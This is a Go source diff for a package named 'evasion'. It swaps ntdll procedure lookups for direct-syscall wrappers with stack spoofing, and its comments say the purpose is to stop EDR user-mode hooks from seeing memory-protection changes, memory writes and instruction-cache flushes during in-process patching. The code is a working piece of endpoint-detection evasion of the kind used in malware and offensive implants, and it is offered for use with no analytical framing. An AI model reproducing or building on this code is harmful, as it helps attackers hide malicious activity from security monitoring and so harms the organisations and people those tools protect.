@@ -4,26 +4,59 @@
 package evasion
 
 import (
+	"sync"
 	"unsafe"
-
-	"golang.org/x/sys/windows"
 )
 
-var (
-	modNtdll                  = windows.NewLazySystemDLL("ntdll.dll")
-	procNtProtectVirtualMemory = modNtdll.NewProc("NtProtectVirtualMemory")
-	procNtWriteVirtualMemory   = modNtdll.NewProc("NtWriteVirtualMemory")
-	procNtFlushInstructionCache = modNtdll.NewProc("NtFlushInstructionCache")
-)
+// NT system-call helpers — all routed through HGProc (direct syscall + stack
+// spoof) so that EDR user-mode hooks on ntdll stubs never intercept them.
+// This also breaks the circular dependency that existed when unhookNtdll()
+// called ntProtect through a potentially-hooked LazyProc before cleaning ntdll.
 
 const ntCurrentProcess = ^uintptr(0) // (HANDLE)-1
 
-// ntProtect changes memory protection via NtProtectVirtualMemory,
-// bypassing kernel32!VirtualProtect (which may be hooked by EDR).
+var (
+	hgNtProtectOnce sync.Once
+	hgNtProtectProc *HGProc
+
+	hgNtWriteOnce sync.Once
+	hgNtWriteProc *HGProc
+
+	hgNtFlushOnce sync.Once
+	hgNtFlushProc *HGProc
+)
+
+func getNtProtectProc() *HGProc {
+	hgNtProtectOnce.Do(func() {
+		hgNtProtectProc = NewHGProc("NtProtectVirtualMemory")
+	})
+	return hgNtProtectProc
+}
+
+func getNtWriteProc() *HGProc {
+	hgNtWriteOnce.Do(func() {
+		hgNtWriteProc = NewHGProc("NtWriteVirtualMemory")
+	})
+	return hgNtWriteProc
+}
+
+func getNtFlushProc() *HGProc {
+	hgNtFlushOnce.Do(func() {
+		hgNtFlushProc = NewHGProc("NtFlushInstructionCache")
+	})
+	return hgNtFlushProc
+}
+
+// ntProtect changes memory protection via a direct NtProtectVirtualMemory
+// syscall stub — bypasses any EDR hook on the ntdll dispatch path.
 func ntProtect(addr uintptr, size uintptr, newProtect uint32) (oldProtect uint32, ok bool) {
+	p := getNtProtectProc()
+	if p == nil {
+		return 0, false
+	}
 	baseAddr := addr
 	regionSize := size
-	r, _, _ := procNtProtectVirtualMemory.Call(
+	r, _, _ := p.Call(
 		ntCurrentProcess,
 		uintptr(unsafe.Pointer(&baseAddr)),
 		uintptr(unsafe.Pointer(&regionSize)),
@@ -33,11 +66,14 @@ func ntProtect(addr uintptr, size uintptr, newProtect uint32) (oldProtect uint32
 	return oldProtect, r == 0
 }
 
-// ntWrite writes bytes directly via NtWriteVirtualMemory.
-// After unhookNtdll() this reaches a clean syscall stub.
+// ntWrite writes bytes directly via a direct NtWriteVirtualMemory syscall.
 func ntWrite(dst uintptr, src []byte) bool {
+	p := getNtWriteProc()
+	if p == nil {
+		return false
+	}
 	var written uintptr
-	r, _, _ := procNtWriteVirtualMemory.Call(
+	r, _, _ := p.Call(
 		ntCurrentProcess,
 		dst,
 		uintptr(unsafe.Pointer(&src[0])),
@@ -49,5 +85,9 @@ func ntWrite(dst uintptr, src []byte) bool {
 
 // ntFlush flushes the CPU instruction cache after patching executable memory.
 func ntFlush(addr uintptr, size uintptr) {
-	procNtFlushInstructionCache.Call(ntCurrentProcess, addr, size)
+	p := getNtFlushProc()
+	if p == nil {
+		return
+	}
+	p.Call(ntCurrentProcess, addr, size)
 }
